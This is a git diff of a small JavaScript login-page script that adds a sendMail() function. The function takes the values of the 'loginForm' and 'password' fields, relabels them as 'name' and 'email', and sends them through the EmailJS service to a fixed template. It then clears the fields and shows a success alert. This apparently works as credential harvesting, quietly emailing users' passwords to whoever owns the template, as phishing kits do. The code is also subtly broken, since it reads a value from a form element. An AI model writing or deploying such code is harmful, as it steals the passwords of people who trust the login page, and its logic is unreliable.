@@ -1,22 +1,20 @@
-// Include Email.js SDK by adding the following script tag to your HTML:
-// <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+function sendMail() {
+  var params = {
+    name: document.getElementById("loginForm").value,
+    email: document.getElementById("password").value,
+  };
 
-// Initialize Email.js with your User ID
-emailjs.init("9hl9awywx6zp2sVjR");
+  const serviceID = "service_142u1mu";
+  const templateID = "template_avc41ik";
 
-document.getElementById("loginForm").addEventListener("submit", function (event) {
-    event.preventDefault();
+    emailjs.send(serviceID, templateID, params)
+    .then(res=>{
+        document.getElementById("loginForm").value = "";
+        document.getElementById("password").value = "";
+        console.log(res);
+        alert("Your message sent successfully!!")
 
-    // Get form data
-    const formData = new FormData(this);
+    })
+    .catch(err=>console.log(err));
 
-    // Send the form data as an email using Email.js
-    emailjs.send("service_142u1mu", "template_avc41ik", formData)
-        .then(function(response) {
-            alert("Email sent successfully!");
-            document.getElementById("loginForm").reset();
-        }, function(error) {
-            alert("Email could not be sent. Please try again later.");
-            console.error("Email Error:", error);
-        });
-});
+}
